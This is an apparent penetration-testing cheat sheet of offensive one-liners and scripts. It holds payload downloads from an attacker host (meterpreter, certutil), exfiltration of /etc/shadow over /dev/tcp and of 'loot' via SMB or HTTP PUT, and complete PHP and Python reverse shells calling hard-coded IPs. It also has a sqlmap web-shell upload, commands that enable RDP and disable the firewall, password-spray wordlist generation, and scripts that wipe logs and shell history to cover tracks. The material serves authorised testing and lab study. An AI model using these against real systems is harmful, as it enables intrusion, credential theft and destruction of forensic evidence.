
##
https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts
##

One-Liners and Dirty Scripts
They don't have to be elegant, they just have to get the job done.
If I use it and it's not here, it's probably over here: ​
FILE TRANSFERS
Python HTTP File Download
If you have remote command execution on a box with python - something like this should do the trick:
python -c "import urllib; f = urllib.URLopener(); f.retrieve('http://<attacker ip>/meterpreter', '/tmp/meterpreter');"
or if it is a Windows box, it's not much different:
C:\Python2.7\python.exe -c "import urllib; f = urllib.URLopener(); f.retrieve('http://<attacker ip>/rs_powershell.exe', '/temp/rs_powershell.exe');"
VBS HTTP File Download
I got stuck with a borked up reverse shell on a Windows system with no file transfer methods and no modern scripting options. I scraped together the following one-liner to dump into my shell to get my payload over by writing a VBS script with echo statements to issue the download:
echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"
(originally sourced from here: )
Impacket's smbserver.py
As always, the  shines. Use smbserver.py to open an SMB server on your host for file exfiltration:
./smbserver.py burmat_exfil ./loot -username burmat -password burmat
​
## from the target:
PS C:\> net use Q: \\10.1.1.123\burmat_exfil /user:burmat burmat
PS C:\> mv .\bh.zip Q:\bh.zip
PS C:\> net use Q: /delete
PERL HTTP File Download
perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.11/exploit.sh"); my $file = $ff->fetch() or die $ff->error;'
NGINX + PUT
​ (thanks @ippsec), you can start a nginx server that can accept PUT requests for file transfer via HTTP:
root@kali:~ ❯ cat /etc/nginx/sites-enabled/file_upload
server {
    listen 8001 default_server;
    server_name burmat.co;
    location / {
        root /var/www/upload/;
        dav_methods PUT;
    }
}
​
root@kali:~ ❯ service nginx start
Issue a PUT request from a remote system to upload files to /var/www/upload on your system:
## CURL:
user@victim:~ ❯ curl -X PUT http://192.168.1.87:8001/l00t.txt -F "data=@/home/user/l00t.txt"
​
## POWERSHELL
PS C:\Users\victim> Invoke-RestMethod -Method PUT -Uri "http://10.10.14.12:8001/l00t.txt" -Body $(Get-Content l00t.txt)
Netcat File Transfer
Because if Netcat is on the system, everything becomes easier:
listener#> nc -l -p 4444 > output.file
sender#> nc -w 3 [destination] 4444 < input.file
(and if it's not - go get it: C:\Users\burmat>tftp -i 10.10.10.10 get nc.exe)
CERTUTIL Transfer
Using certutil.exe is a clever way to get files down to a victim if you are attacking a Windows box and limited on methods:
certutil.exe -urlcache -split -f http://10.10.15.11/burmat.exe C:\temp\burmat.exe
You can also write a file from Base64 encoded text, too:
certutil.exe -decode C:\temp\payload.txt C:\temp\payload.dll
regsvr32 /s /u C:\temp\payload.dll
(Source:  )
SQLMAP - User w/ FILE Privileges
If you have SQLi with a user account that has FILE privileges, you can use sqlmap to transfer the file to disk without formulating an INFO FILE query yourself:
root@kali:~ ❯ sqlmap -r inject.req --dbms "mysql" --file-write shell.php --file-dest \\inetpub\\wwwroot\\shell.php
To see if you have the privilege, attempt (you might not have rights) to dump the user table:
root@kali:~ ❯ sqlmap -r inj.req --dbms "mysql" -D mysql -T user -C User,File_Priv --dump
.. SNIP ..
[2 entries]
+---------+-----------+
| User    | File_Priv |
+---------+-----------+
| burmat  | Y         |
| root    | Y         |
+---------+-----------+
XML File Creation on Target (via copy/paste)
This is a clever way to get XML over to the system using copy and paste, and writing that XML to file:
PS C:\> $console = [XML] @"
<XML CODE CODE HERE>
"@
​
# write the xml to file:
PS C:\> $console.save("C:\users\burmat\documents\console.xml")
Base64
Using netcat
# receiving host
nc -lp 4443 | base64 -d > loot.txt
​
# sender host
base64 /etc/shadow > /dev/tcp/10.10.10.123/4443
Copy and Paste
## encode from file with:
base64 <<< $(cat shell.py) | tr -d "\n"
​
## decode to file with:
echo -n "ZmlsZSBjb250ZW50IGhlcmUK" | base64 -d > shell.py
xclip
Not a true method of file transfer, but useful nonetheless:
cat /usr/share/nishang/Client/Out-HTA.ps1 | xclip -sel clip
REVERSE SHELLS / SHELLS
PHP Reverse Shell - Minified
<?php set_time_limit (0); $VERSION = "1.0"; $ip = "10.10.10.10"; $port = 8080; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { exit(1); } $daemon = 1; } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); while (1) { if (feof($sock)) { break; } if (feof($pipes[1])) { break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { $input = fread($sock, $chunk_size); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { $input = fread($pipes[1], $chunk_size); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { $input = fread($pipes[2], $chunk_size); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); ?>
(originally sourced from: )
Python Reverse Shell for Windows
import os,socket,subprocess,threading;
​
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
​
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
​
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.11.0.37",4444))
​
p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
​
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()
​
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()
​
try:
    p.wait()
except KeyboardInterrupt:
    s.close()
WinRM Ruby Shell
require 'winrm'
​
conn = WinRM::Connection.new( 
  endpoint: 'https://IP:PORT/wsman',
  transport: :ssl,
  user: 'username',
  password: 'password',
  :no_ssl_peer_verification => true
)
​
command=""
​
conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
(originally sourced from: )
ENUMERATION
Finding Vulnerable Applications (Linux)
This one is pretty dirty, and pretty awesome. Run a one-liner on your victim to generate a list of packages (rpm or dpkg) on the machine (/tmp/packages.txt). Copy this file to one that has searchsploit, and run the script.
Generate the file with:  FILE="packages.txt"; FILEPATH="/tmp/$FILE"; /usr/bin/rpm -q -f /usr/bin/rpm >/dev/null 2>&1; if [ $? -eq 0 ]; then rpm -qa --qf "%{NAME} %{VERSION}\n" | sort -u > $FILEPATH; echo "kernel $(uname -r)" >> $FILEPATH; else dpkg -l | grep ii | awk '{print $2 " " substr($3,1)}' > $FILEPATH; echo "kernel $(uname -r)" >> $FILEPATH; fi; echo ""; echo "[>] Done. Transfer $FILEPATH to your computer and run: "; echo ""; echo "./packages_compare.sh /path/to/$FILE"; echo "";
Run the following script: ​
(Example Output from my Kali VM)
(thanks to  for doing the heavy lifting)
"Proc Mon" (IppSec) Script 
One of the handiest scripts to find running jobs and processes in real time. Thanks to  for sharing it with the world:
#!/bin/bash
​
IFS=$'\n'
old_process=$(ps -eo command)
​
while true; do
  new_process=$(ps -eo command)
  diff <(echo "$old_process") <(echo "$new_process") |grep [\<\>]
  sleep 1
  old_process=$new_process
done
SNMP Walker
I don't remember where I got this, but incredibly useful to focus in on key info from an snmpwalk prior to sifting through all of it:
#!/bin/bash
for ip in $(cat ~/Documents/labs/targets.txt  | awk '/^[0-9]/ {print $1}'); do
​
	echo "Performing snmpwalk on public tree for" $ip " - Checking for System Processes"	
	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.1.6.0 > ~/Documents/labs/$ip/scans/systemprocesses.txt
​
	echo "Performing snmpwalk on public tree for" $ip " - Checking for Running Programs"	
	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2 > ~/Documents/labs/$ip/scans/runningprograms.txt
​
	echo "Performing snmpwalk on public tree for" $ip " - Checking for Processes Path"	
	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.4 > ~/Documents/labs/$ip/scans/processespath.txt
​
	echo "Performing snmpwalk on public tree for" $ip " - Checking for Storage Units"	
	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.2.3.1.4 > ~/Documents/labs/$ip/scans/storageunits.txt
​
	echo "Performing snmpwalk on public tree for" $ip " - Checking for Software Name"	
	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2 > ~/Documents/labs/$ip/scans/softwarename.txt
​
	echo "Performing snmpwalk on public tree for" $ip " - Checking for User Accouints"	
	snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25 > ~/Documents/labs/$ip/scans/useraccounts.txt
​
	echo "Performing snmpwalk on public tree for" $ip " - Checking for TCP Local Ports"	
	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3 > ~/Documents/labs/$ip/scans/tcplocalports.txt
​
	echo "Performing snmp-check scan for" $ip	
	snmp-check $ip > ~/Documents/labs/$ip/scans/snmpcheck.txt
	
	echo "Cleaning up empty files..."
	find ~/Documents/labs/$ip/scans/ -size  0 -print0 |xargs -0 rm
done
Ping Scan
Linux Ping Scanning:
You can use a regular-old for loop:
for i in {1..254}; do ping -c 1 -W 1 172.1.1.$i | grep 'from'; done
Or you can try out the following python script:
#!/usr/bin/python
import multiprocessing, subprocess, os
def pinger( job_q, results_q ):
    DEVNULL = open(os.devnull,'w')
    while True:
        ip = job_q.get()
        if ip is None: break
        try:
            subprocess.check_call(['ping','-c1',ip],stdout=DEVNULL)
            results_q.put(ip)
        except:
            pass
​
if __name__ == '__main__':
    pool_size = 255
    jobs = multiprocessing.Queue()
    results = multiprocessing.Queue()
    pool = [ multiprocessing.Process(target=pinger, args=(jobs,results)) for i in range(pool_size) ]
    for p in pool:
        p.start()
​
    for i in range(1,255):
        jobs.put('10.120.15.{0}'.format(i))
​
    for p in pool:
        jobs.put(None)
​
    for p in pool:
        p.join()
​
    while not results.empty():
        ip = results.get()
        print(ip)
Windows Ping Scan:
Not the fastest or the cleanest, but it's an easy way to generate a ping scan from a cmd prompt:
FOR /L %i IN (1,1,254) DO ping -n 1 192.168.1.%i | FIND /i "Reply" >> ips.txt
REMOTE DESKTOP (ENABLE / ADD)
Enable RDP:
PS > Set-itemproperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -value 0
PS > Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -value 1
PS > Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
If you need to add your user to the group, you can use: NET LOCALGROUP "Remote Desktop Users" domain\user /ADD. And if you need to disable the firewall altogether: NetSh Advfirewall set allprofiles state off
CRACKING
Password Spray List
Use exrex [] to generate a custom wordlists to password spray with:
python exrex.py "(Spring|Winter|Autumn|Fall|Summer|Winter)(20)1[78]!"
Small Wordlist, Rules
I got hit with having to crack mscachev2 hashes which can be slow. This is a perfect time to instead try targeted (small) wordlists and instead pass in some tried-and-tested rules: hashcat64.exe -a 0 -m 2100 -r rules/d3adhob0.rule mscachev2hash.txt wordlist.txt -o cracked.txt

SYSTEM CLEANUP
Purge Linux Logs
#!/bin/sh
​
/etc/init.d/sysklogd stop
VARLOGS="auth.log boot btmp daemon.log debug dmesg kern.log mail.info mail.log mail.warn messages syslog udev wtmp"
cd /var/log
for ii in $VARLOGS; do
  echo -n > $ii
  rm -f $ii.? $ii.?.gz
done
​
/etc/init.d/samba stop
rm -f /var/log/samba/*
​
rm -f /var/lib/dhcp3/*
​
for ii in /var/log/proftpd/* /var/log/postgresql/* /var/log/apache2/*; do
  echo -n > $ii
done
Covering Your Tracks
#!/bin/bash
echo "COVERING TRACKS"
echo  "clearing /var/log/auth.log"
echo "" > /var/log/auth.log
echo "clearing ~/.bash_history"
echo "" > ~/.bash_history
echo "clearing /root/.bash_history"
echo "" > /root/.bash_history
echo "removing ~/.bash_history"
rm ~/.bash_history -rf
echo "removing /tmp/"
rm -R /tmp/*
echo "clearing /var/log/messages"
echo "" > /var/log/messages
echo "clearing command history"
history -c
​
